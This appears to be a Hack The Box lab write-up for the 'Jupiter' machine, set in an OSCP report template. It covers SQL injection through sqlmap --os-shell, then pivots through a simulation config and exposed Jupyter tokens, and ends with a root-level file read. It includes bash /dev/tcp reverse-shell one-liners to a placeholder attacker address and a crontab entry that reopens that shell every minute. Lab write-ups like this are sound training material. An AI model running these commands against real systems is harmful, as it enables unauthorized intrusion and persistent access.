---
# pandoc settings
title: "Offensive Security Certified Professional Exam Report"
author: ["student@youremailaddress.com", "OSID: XXXX"]
date: "2020-07-25"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
book-class: false
classoption: oneside
code-block-font-size: \scriptsize

# image rename settings
imageNameKey: replace-me
---

# Enumeration
Accessing the website, it's a web sever hosting information about space.

![[Pasted image 20230616133355.png]]
Some quick manual enumeration identifies some useful extensions

* `.html`
* `.jpg|svg|gif`

![[Pasted image 20230616133903.png]]


This looks like a static site. Attempts to enumerate endpoints failed with FerOxBuster and GoBuster.

![[Pasted image 20230622095709.png]]
![[Pasted image 20230622095758.png]]

`curl` can reach it, oddly enough

![[Pasted image 20230622100244.png]]

## vhost enumeration

Not much to go on.  Let's see if there are any subdomains. 

GoBuster turns up a subdomain of `kiosk.jupiter.htb`.

```bash
gobuster vhost \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
    -u jupiter.htb \
    -o jupiter.gobuster
    --append-domain
```

* `-w` : specifiy wordlist.  I tried a few wordlists but SecLists found it
* `-u`: host
* `-o`: capture output to file
* `--append-dommain`: "Append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist."

![[Pasted image 20230622100752.png]]

Update `/etc/hosts`

```
10.10.11.216    jupiter.htb kiosk.jupiter.htb
```

## Subdomain: kiosk.jupiter.htb

![[Pasted image 20230616135425.png]]

Accessing `kiosk.jupiter.htb`, notice there is a rapid succession of redirects, and we land on the page shown above.  Scrolling down the page, you'll see some information populate dynamically on the page.  This suggests the use of a back-end database.

![[Pasted image 20230616142135.png]]

Capture this sequence of requests in Burpsuite.

>[!tip]
>Use the "passive capture" HTTP History feature on the Proxy tab in Burpsuite to capture the entire sequence.

Examine the requests.  Eventually, we find a POST request to the `/api/ds/query` API endpoint, transmitting JSON data with a field named `rawSql`.

![[Pasted image 20230616142814.png]]

Confirming the parameter is injectible:

![[Pasted image 20230616143356.png]]
![[Pasted image 20230616143519.png]]

# Foothold

Database dumping confirms the back-end database as a PostgreSQL database, but there isn't much of value to be found.  We learn about a Grafana user, but that leads nowhere productive I've found.  There's a massive table that takes forever to dump, but you can ignore it.

## Initial Foothold: `sqlmap --os-shell`

Use BurpSuite to save the injectible request - this can be used with `sqlmap` in order to simplify back-end database enumeration.  You can use any filename - we chose `kiosk.req`.

![[00 - Enumeration#^c405af]]

Confirm that the request is usable.

```bash
sqlmap -r kiosk.req # change filename as needed
```

![[Pasted image 20230616144443.png]]

### Testing for vulnerability to `--os-shell`
`sqlmap --help`: 
![[Pasted image 20230616144749.png]]

So far, we've confirmed that the captured injectible request is usable by `sqlmap`. Use the command below to gain an `--os-shell` on the target:

![[00 - Enumeration#^a06044]]

The output from this shell is really cluttered, so it's not shown here.  Do some poking around to confirm these things:

* cwd of `--os-shell` is `/var/lib/postgresql/14/main`
* it is not possible to change directories, but you can read other directories and files
* you can use this shell to reach back to the attacker machine

![[Pasted image 20230622104943.png]]

![[Pasted image 20230622105103.png]]

The two images above confirm that we can 
1. use `wget` to transfer files from the attacker machine to the target, and
2. write to `/var/lib/postgresql/14/main`

### reverse shell
Set up a listener on the attacker and use your favorite reverse shell to connect back.  Shown here is a variant of the bash one-liner.

```bash
os-shell> bash -c 'bash -i >& /dev/tcp/<attacker ip>/<port> 0>&1'
```


## Further enumeration
While we have a shell, do some light enumeration.  Look for other users on the box, other services, and SUID binaries.

```bash
 ss -ltp # show listening TCP ports and associated processes
 
 grep sh$ /etc/password # show all users with shell access on box
 
 find / -perm -4000 -type f -ls 2>/dev/null # list all SUID binaries

```

### more ports
The command `ss -ltp` reveals a few listening ports which did not show up in the nmap scan.  

![[Pasted image 20230622165222.png]]

We'll check these out later.

### users with shell access
![[Pasted image 20230622165358.png]]

### SUID binaries
![[Pasted image 20230622165547.png]]
There's not much that can be done with the SUID binaries.  Attempts to abuse `sudo` fail.
![[Pasted image 20230622165645.png]]

>[!note]
>As other HTB users work through this machine, you may find they have left behind artifacts which can be exploited to gain user(s).  If the Spirit moves you, be my guest

### Persistent foothold

The best success I had with a persistent foothold was by creating a crontab entry for the `postgres` user.

In the reverse shell on the attacker:
```bash
[EDITOR=vim] crontab -e
```

The `[EDITOR=vim]` is optional - if you include this (without the square brackets), it forces `crontab` to use `vim` as the editor, otherwise it uses the default editor, which is typically `nano`.  Dealer's choice. See note at end of section.

Add this line to the bottom of the crontab.
```crontab
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1'
```

This entry sends a reverse shell to the attacker IP every minute.

I had varying success with attempting to create and transfer SSH keys, but the crontab technique seems to be the most reliable.  The reverse shell will make your screen behave strangely, so if you use `vim`, just have faith.

![[Pasted image 20230622131937.png]]

>[!note]
>When reading command documentation, something enclosed in square brackets means one of two things:
>1. optional parameters/flags that can be passed to a command
>2. a choice of options, with the default choice (usually) capitalized, e.g. \[Y/n/a\].  Typically, pressing \<enter\> will accept the default choice

# Pivot to User

We know from examining `/etc/passwd` that there are four total users on the box with shell access.  We know who the `postgres` and `root` users are.  Let's investigate `juno` and `jovian`.

Each user has a directory in the `/home` folder, but the `postgres` user has insufficient privileges to do anything about it.

![[Pasted image 20230622170243.png]]

## Juno

`juno` belongs to the groups `juno` and `science`.  

### files owned by `juno` user
Looking for files owned by user `juno`

```bash
find / -user juno -type f -ls 2>/dev/null
```

![[Pasted image 20230622171034.png]]

Let's check out `/dev/shm`

![[Pasted image 20230622175448.png]]
Interesting.  Within the file `network-simulation.yml`, there are commands to binaries.  Let's see if any programs are running that call this file.

![[Pasted image 20230622182706.png]]

It appears that `juno` is running a command that uses this file.

Searching the internet for "shadow network simulation", you'll eventually come to [this page](https://shadow.github.io/docs/guide/security.html) describing the "non security" of the Shadow Network simulation tool:

>Shadow currently doesn't restrict access to the host file system. A malicious managed program can read and modify the same files that Shadow itself can.

Can we abuse this?
![[Pasted image 20230622184222.png]]

Using `pspy` (or some equivalent bash-foo), we see that periodically `juno` is calling a script, which reads `/dev/shm/network-simulation.yml`, which in turn invokes the Python Simple HTTP server.  

>[!important]
>Not shown in the output above are the commands which 'reset' the `/dev/shm` directory.  This periodically overwrites `/dev/shm/network-simulation.yml` with a template copy from `/home/juno`. However, it does not touch any files you may have placed in `/dev/shm`.

Testing with `curl`, `bash`, and `nc`, we can't reach back to the attacker.  Maybe we can do something on the system.

![[Pasted image 20230622213326.png]]

We can write to `/tmp` as `juno`.  Let's create a `bash` SUID binary

>[!note]
>The script that runs this playbook runs approximately every two minutes, meaning you will need to wait each time you edit your exploit.

### create SUID bash binary

![[Pasted image 20230622214002.png]]

### shell as `juno`
Use the `chmod` command to set the SUID permission on the `bash` binary just copied.

```bash
chmod u+x /tmp/bash
```
![[Pasted image 20230622214803.png]]

Invoke the `bash` binary as `juno` by calling
```bash
/tmp/bash -p
```

### create SSH keys with privileged shell
Now we have a privileged shell as "juno".  If we attempt a reverse shell from here, we'll get one as `postgres`, not `juno`.  This is because the privileged shell sets the "elevated privilege UID", or EUID to the owner's, and not all commands make use of the EUID.

For example, with this shell we still can't read `user.txt`.

![[Pasted image 20230622215315.png]]
But we can generate an ssh key pair.

![[Pasted image 20230622215746.png]]
Make sure to save the new keys in the correct place: `/home/juno/.ssh/id_rsa`.  Additionally, make sure to add the entire public key to a single line in `/home/juno/.ssh/authorized_keys`

Transfer the private key to the attacker.
![[Pasted image 20230622220246.png]]

Access the target.  On the attacker:

```bash
chmod 600 juno.key
ssh -i juno.key juno@jupiter.htb
```

![[Pasted image 20230622220501.png]]

### user flag
![[Pasted image 20230622220701.png]]

## Jovian

### SSH port forwarding - investigating other listening services

Recall [[#more ports|those other HTTP servers]] we found earlier.

![[Pasted image 20230622165222.png]]
We can use SSH to do some port forwarding and attempt to access those HTTP servers.

The syntax for port forwarding is (from attacker)
```bash
ssh -i juno.key \
    -L <attacker port>:localhost:<target port> \
    juno@jupiter.htb
```

After the connection and port forwarding are established, access the ports from the attacker in a browser at `http://localhost:<attacker port>`

#### Port 3000
![[Pasted image 20230622221635.png]]
Gee, this looks familiar.  Next!

#### Port 8888

![[Pasted image 20230622223950.png]]

A Jupyter notebook instance, asking for a token. Let's go find one.

As `juno`, attempts to use the `jupyter notebook list` command fail:
![[Pasted image 20230623105757.png]]

If we look to see which processes are running under `jovian`, you can see a Python call associated with the Jupyter Notebook instance.

![[Pasted image 20230622225105.png]]
The argument passed to Jupyter is group read/writable by members of the `science` group, which includes `juno`.  The `logs` directory in this folder looks interesting.

In `/opt/solar-flares/logs` are many log files dating back months.  Examining them exposes tokens used to access the Jupyter notebook instance.

![[Pasted image 20230622223906.png]]

I tested two tokens: one from the file with the most recent date, and one from a randomly chosen file.  Each of the selected tokens worked, so I suspect it doesn't matter which token you choose.

Supplying a token to the login page takes you to a file where you can create a new Notebook.

![[Pasted image 20230622230219.png]]

Create a new notebook, and do some testing.
![[Pasted image 20230623090514.png]]
We have command execution as Jovian.

Let's see if we can get a reverse shell:

![[Pasted image 20230623091044.png]]
![[Pasted image 20230623091131.png]]

Success!

If this isn't cooperating, you could also adapt the process of [[#create SUID bash binary|creating an SUID binary]]  [[#create SSH keys with privileged shell|and SSH key]] to the Jupyter notebook process.

### reverse shell as `jovian`
![[Pasted image 20230623092621.png]]

Looks like `jovian` can run the `/usr/local/bin/sattrack` binary as root.  There's a local copy in `jovian`'s home directory - what does it do?

![[Pasted image 20230623094119.png]]

We get the same error when we run as root and as `jovian` - complaining about some config file not being found. Using `strace` we see that the program can't open the file `/tmp/config.json`.

![[Pasted image 20230623094325.png]]

Since we're trying to get to root, look for any files on the system named `config.json` which are also owned by root.
![[Pasted image 20230623094809.png]]
Bingo!  Can we exploit this?  It's looking for the file `/tmp/config.json`. Let's copy what we've found there and see what happens when we run `jovian`'s copy.
### running sattrack as `jovian`
![[Pasted image 20230623095621.png]]

The `sattrack` binary creates the `/tmp/tle` directory and writes stuff there.  It looks like it's trying to fetch satellite data from a few different sources.  Maybe we can get local files.

![[Pasted image 20230623101259.png]]
Looks like we have LFI as root - `/etc/passwd` was successfully copied to `/tmp/tle` with root as the owner.
# root flag
We can abuse this LFI to get the root flag.
![[Pasted image 20230623101535.png]]

# did we root tho

We managed to capture the root flag, but I still haven't managed to get a root shell.

Since we have root read access, we can grab `/etc/shadow` and attempt to crack those hashes, but they're encrypted with `yescrypt` which isn't yet supported very well with the common hash cracking tools.

I may continue to poke around on this box to see if there's a path to root.